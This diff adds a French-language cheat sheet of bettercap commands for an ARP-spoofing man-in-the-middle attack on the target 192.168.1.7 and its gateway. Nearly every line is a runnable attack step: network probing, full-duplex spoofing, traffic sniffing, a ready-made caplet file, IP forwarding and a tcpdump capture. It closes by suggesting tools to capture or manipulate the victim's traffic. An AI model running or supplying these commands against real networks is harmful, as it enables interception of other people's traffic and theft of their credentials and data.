@@ -1,0 +1,74 @@
+Active la détection des appareils sur le réseau. Cela permet d'identifier les cibles disponibles.
+
+net.probe on 
+
+Configure l'usurpation ARP (ARP spoofing) pour fonctionner en mode bidirectionnel (entre la cible et la passerelle, et vice versa).
+
+set arp.spoof.fullduplex true 
+
+Désigne l'adresse IP cible (ici, la machine 192.168.1.7).
+
+set arp.spoof.targets 192.168.1.7 
+
+Active l'écoute du trafic local pour capturer les données échangées.
+
+set net.sniff.local true 
+
+Lance l'usurpation ARP pour rediriger le trafic de la cible vers l'attaquant.
+
+arp.spoof on 
+
+Active l'écoute et la capture du trafic réseau (sniffing).
+
+net.sniff on 
+
+
+
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.7
+set net.sniff.local true
+arp.spoof on
+net.sniff on
+
+
+Ecouter en local
+
+
+En une seule configuration : 
+nano sniff.cap 
+
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.7
+set net.sniff.local true
+arp.spoof on
+net.sniff on
+
+tape ctrl+x and yes
+
+bettercap -iface eth0  -caplet sniff.cap
+
+---
+Configuration interface 
+
+set net.sniff.iface eth0
+Routage activé (pour rediriger le trafic) :
+Si vous prévoyez de transmettre le trafic entre la cible et la passerelle (MITM complet), activez le routage IP sur votre machine d'attaque :
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Capture des données :
+Assurez-vous que l'outil utilisé pour le sniffing (comme Wireshark ou tcpdump) est prêt à capturer le trafic :
+
+tcpdump -i eth0 -w capture.pcap
+
+Test des droits et permissions :
+Vous aurez besoin de privilèges root pour lancer ces commandes.
+
+Complément sur la cible (passerelle) :
+Si la cible doit communiquer avec la passerelle (192.168.1.1 dans un réseau classique), vous devez également ajouter la passerelle comme cible d'ARP spoofing :
+
+set arp.spoof.targets 192.168.1.1
+
+Vous pouvez utiliser des outils comme ettercap, mitmproxy ou bettercap pour compléter l'attaque et capturer ou manipuler le trafic réseau.
+
